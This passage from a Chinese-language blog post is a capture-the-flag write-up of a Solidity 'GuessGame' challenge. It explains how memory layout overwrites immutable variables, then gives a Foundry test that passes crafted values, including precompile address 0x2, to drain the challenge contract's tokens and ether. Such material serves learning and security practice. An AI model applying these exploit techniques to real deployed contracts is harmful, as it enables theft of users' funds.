assembly&#123;</span><br><span class="line">                mstore(_random01, money)</span><br><span class="line">            &#125;</span><br><span class="line">            require(random01 == arr.length,&quot;wrong number01&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 y = ( uint160(address(msg.sender)) + random01 + random02 + random03 + _random02) &amp; 0xff;</span><br><span class="line">        require(random02 == y,&quot;wrong number02&quot;);</span><br><span class="line"></span><br><span class="line">        require(uint160(_random03) &lt; uint160(0x0000000000fFff8545DcFcb03fCB875F56bedDc4));</span><br><span class="line">        (,bytes memory data) = address(uint160(_random03)).staticcall(&quot;Fallbacker()&quot;);</span><br><span class="line">        require(random03 == data.length,&quot;wrong number03&quot;);</span><br><span class="line"></span><br><span class="line">        require(random04.number() == _random04, &quot;wrong number04&quot;);</span><br><span class="line"></span><br><span class="line">        mytoken.transfer(msg.sender,100);</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() external view returns(bool)&#123;</span><br><span class="line">        return mytoken.balanceOf(address(this)) == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract SetUp &#123;</span><br><span class="line"></span><br><span class="line">    A public a ;</span><br><span class="line">    GuessGame public guessGame;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        a = new A();</span><br><span class="line">        guessGame = new GuessGame(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns(bool) &#123;</span><br><span class="line">        return guessGame.isSolved();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Analysis-7"><a href="#Analysis-7" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题让我们将<code>GuessGame</code>的所有<code>token</code>掏空，我们可以看到这道题的几个<code>random</code>是用<code>immutable</code>来定义的，<code>immutable</code>变量是将变量值存储在字节码中，其在构造函数中初始化时是通过内存来修改的，所以在构造函数中调用的<code>pureFunc()</code>将前三个数<code>01 02 03</code>的值修改为<code>1 2 32</code>了，为什么修改的是这三个变量，内存的布局中空闲指针最初指向<code>0x80</code>，而<code>0x00-0x3f</code>用来暂存哈希方法，<code>0x40-0x5f</code>用来存储当前分匹配的内存大小，<code>0x60-0x7f</code>是0 值插槽，是用来对动态内存数组进行初始化，且永远不会写入数据。</p>
<p>这时我们看<code>guess()</code>函数，第一步将<code>msg.value</code>存入<code>_randim01</code>中并比较<br><code>random01</code>和<code>arr</code>数组长度是否相等，这一步我们需要修改<code>arr</code>数组的长度让其与<code>random01</code>的值相等，我们只需要让<code>_random01=0x60</code>，并发送<code>1 wei</code>即可</p>
<p>第二步是让<code>uint256 y = ( uint160(address(msg.sender)) + random01 + random02 + random03 + _random02) &amp; 0xff;</code>和<code>random02</code>相等，也就是等于<code>2</code>，我们只需要通过<code>(2-(address+1+2+0x20))&amp;0xff</code>计算即可得到</p>
<p>第三步是让<code>uint160(_random03) &lt; uint160(0x0000000000fFff8545DcFcb03fCB875F56bedDc4)</code>并且返回一个<code>32</code>字节的数据，看到这么小的地址我们可以想到预编译合约，我们可以利用<code>0x2</code>这个地址，他会返还一串哈希加密的结果，正好是<code>32</code>字节。</p>
<p>第四步让<code>random04.number() == _random04</code>，查看其他合约可知为<code>10</code></p>
<h4 id="Attack-7"><a href="#Attack-7" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/A.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ATest is Test &#123;</span><br><span class="line">    SetUp public _setUp;</span><br><span class="line"></span><br><span class="line">    function setUp() external &#123;</span><br><span class="line">        _setUp = new SetUp();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_issolved() public &#123;</span><br><span class="line">        GuessGame game = _setUp.guessGame();</span><br><span class="line"></span><br><span class="line">        uint256 random2 = 256 - ((uint160(address(this)) + 1 + 2 + 32) &amp; 0xff) + 2;</span><br><span class="line">        game.guess&#123;value: 1&#125;(0x60, random2, 0x2, 10);</span><br><span class="line"></span><br><span class="line">        assertTrue(_setUp.isSolved());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/10/11/Solidity%20%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" rel="prev" title="Solidity 基础漏洞">
                  <i class="fa fa-angle-left"></i> Solidity 基础漏洞
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/11/12/DamnVulnerableDeFi/" rel="next" title="Damn Vulnerable DeFi(未完待续)">
                  Damn Vulnerable DeFi(未完待续) <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">scw</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
